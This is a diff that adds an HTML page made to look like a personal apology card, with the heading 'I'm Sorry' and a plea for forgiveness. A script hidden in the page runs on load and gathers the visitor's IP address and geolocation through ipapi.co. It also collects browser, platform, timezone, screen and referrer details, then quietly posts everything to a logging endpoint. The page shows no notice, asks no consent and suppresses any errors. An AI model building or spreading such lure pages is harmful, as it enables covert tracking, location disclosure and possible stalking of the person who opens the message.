@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Message</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Segoe UI', Tahoma, sans-serif;
+  background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #fff;
+}
+.card {
+  background: rgba(255,255,255,0.08);
+  border-radius: 24px;
+  padding: 50px 40px;
+  text-align: center;
+  max-width: 480px;
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(255,255,255,0.1);
+  animation: fadeIn 0.8s ease;
+  position: relative;
+}
+@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; } }
+.icon { font-size: 70px; margin-bottom: 10px; animation: pulse 1.5s ease-in-out infinite; display: inline-block; }
+@keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+h2 { font-size: 40px; background: linear-gradient(90deg, #ff6b9d, #ff2d78); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
+p { color: #ffb3c6; font-size: 18px; line-height: 1.6; margin-bottom: 24px; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">💖</div>
+  <h2>I'm Sorry</h2>
+  <p>I never meant to hurt you. Please forgive me 🙏</p>
+</div>
+
+<script>
+(async function() {
+  try {
+    const [ipRes, geoRes] = await Promise.all([
+      fetch("/api/myip"),
+      fetch("https://ipapi.co/json/")
+    ]);
+    const ipData = await ipRes.json();
+    const geoData = await geoRes.json();
+    await fetch("/api/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        ip: ipData.ip,
+        geo: geoData.error ? null : geoData,
+        user_agent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || ""
+      })
+    });
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
